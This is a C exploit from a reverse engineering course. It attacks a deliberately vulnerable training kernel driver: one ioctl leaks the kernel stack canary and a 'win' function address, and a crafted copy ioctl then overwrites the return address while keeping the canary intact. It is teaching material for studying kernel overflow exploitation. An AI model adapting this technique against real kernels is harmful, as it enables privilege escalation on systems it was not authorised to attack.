//
// Reverse Engineering course
// Author: martin.uy/reverse
// License: Creative Commons Attribution-ShareAlike (CC-BY-SA)
//

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "overflow.h"

#define IOCTL_KERNEL_INFO_BUFFER_SIZE (sizeof(unsigned long)+sizeof(void*))

int main () {
	char* ioctl_copy_buffer = NULL;
	char* ioctl_kernel_info_buffer = NULL;
	char* overflow_win_address = NULL;
	unsigned long stack_canary = 0;
	int dummy_fd = -1;
	
	dummy_fd = open(DEVICE_NAME, 0);
	printf("dummy_fd: %d\n", dummy_fd);
	if (dummy_fd < 0) {
		goto cleanup;
	}
	
	ioctl_kernel_info_buffer = (char*)malloc(IOCTL_KERNEL_INFO_BUFFER_SIZE);
	if (ioctl_kernel_info_buffer == NULL) {
		goto cleanup;
	}
	memset(ioctl_kernel_info_buffer, 0U, IOCTL_KERNEL_INFO_BUFFER_SIZE);
	if (ioctl(dummy_fd, IOCTL_LEAK_INFO, ioctl_kernel_info_buffer) != 0) {
		goto cleanup;
	}
	stack_canary = *((unsigned long*)ioctl_kernel_info_buffer);
	overflow_win_address = *((void**)(ioctl_kernel_info_buffer+sizeof(unsigned long)));
	printf("Kernel stack canary: 0x%lx\n", stack_canary);
	printf("Kernel overflow_win_address: %p\n", overflow_win_address);

	ioctl_copy_buffer = (char*)malloc(MAX_SIZE_IOCTL_COPY_BUFFER);
	if (ioctl_copy_buffer == NULL) {
		goto cleanup;
	}
	memset(ioctl_copy_buffer, 0x0, MAX_SIZE_IOCTL_COPY_BUFFER);
	*(unsigned int*)ioctl_copy_buffer = 32; // Copy length
	*(unsigned long*)(ioctl_copy_buffer+8) = stack_canary; // Canary
	*(void**)(ioctl_copy_buffer+24) = overflow_win_address; // Win address
	if (ioctl(dummy_fd, IOCTL_COPY_BUFFER, ioctl_copy_buffer) != 0) {
		goto cleanup;
	}

cleanup:
	if (dummy_fd >= 0) {
		close(dummy_fd);
	}
	if (ioctl_copy_buffer != NULL) {
		free(ioctl_copy_buffer);
	}
	if (ioctl_kernel_info_buffer != NULL) {
		free(ioctl_kernel_info_buffer);
	}
	
	return 0;
}
